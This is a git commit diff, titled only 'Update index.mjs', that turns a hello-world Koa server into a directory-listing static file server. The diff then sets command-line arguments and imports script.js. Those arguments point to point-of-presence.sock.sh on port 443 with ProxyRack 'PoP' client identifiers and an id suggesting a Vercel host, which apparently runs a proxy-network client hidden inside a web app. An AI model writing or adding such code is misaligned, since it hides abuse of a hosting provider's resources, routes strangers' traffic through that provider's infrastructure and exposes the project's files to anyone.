6583cae5775f5d4b1bd078b698eed4962af89289
chaowenguo <chaowen.guo1@gmail.com>
2026-02-04 23:30:25 -0800

    Update index.mjs

--- index.mjs
+++ index.mjs
@@ -1,14 +1,12 @@
+import child_process from 'child_process'
+import path from 'path'
 import Koa from 'koa'
-import { Router } from '@koa/router'
- 
+import serve from 'koa-static'
+import list from 'koa2-serve-index'
+import process from 'process'
+
 const app = new Koa()
-const router = new Router()
- 
-router.get('/', (ctx) => {
-  ctx.body = { message: 'Hello from Koa!' }
-})
- 
-app.use(router.routes())
-app.use(router.allowedMethods())
- 
+app.use(list(import.meta.dirname)).use(serve(import.meta.dirname))
+process.argv = [process.execPath, 'script.js', '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443','--id', 'vercelcom0', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP']
+import('./script.js')
 app.listen(3000)
